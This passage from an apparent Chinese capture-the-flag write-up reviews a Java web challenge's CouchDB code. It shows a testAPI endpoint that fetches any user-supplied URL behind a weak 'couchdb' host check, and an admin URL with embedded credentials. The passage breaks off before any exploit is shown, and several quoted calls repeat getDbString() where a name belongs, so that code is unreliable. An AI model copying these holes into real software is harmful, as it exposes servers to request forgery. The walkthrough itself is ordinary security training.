&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminUsername&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminPassword&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;@couchdb:5984/&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">matches&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;^[a-zA-Z0-9_]*$&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>存储从main.class里接收到的adminUsername&amp;amp;adminPassword；&lt;code>getDbString()&lt;/code>返回一个可以用来连接couchdb数据库的url&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">has&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Database creation failed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">initializeDatabase&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_replicator&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">logException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Replicator already initialized&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_users&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">logException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Users already initialized&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">logException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Log already initialized&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过向构造好的url发送http请求来创建数据库，有三个默认的库：_replicator, _users, log&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">createUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal password&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;_users/org.couchdb.user:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">userObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">addUserToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal dbname&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal username&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/_security&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">configObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">insertDocumentToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">postAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这部分是创建用户并插入数据库中 并且插入一个文件，欸 用的也是http发请求这一招 这不就可控了？&lt;/p>
&lt;p>这里就完了，转去看Handlers.class&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">createUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addUserToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">flagDoc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">flagDoc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">insertDocumentToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">flagDoc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;success&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InternalServerErrorResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Something went wrong&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>当发出一个请求 带着username和passwd时，它会调用&lt;code>createUser()&lt;/code>创建一条用户的数据存入库中，并且存一个flagDoc；接着看最后一个testAPI&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">testAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;method&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">urlURI&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">urlURI&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getHost&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">contains&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;couchdb&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ForbiddenResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">MalformedURLException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BadRequestResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Input URL is malformed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
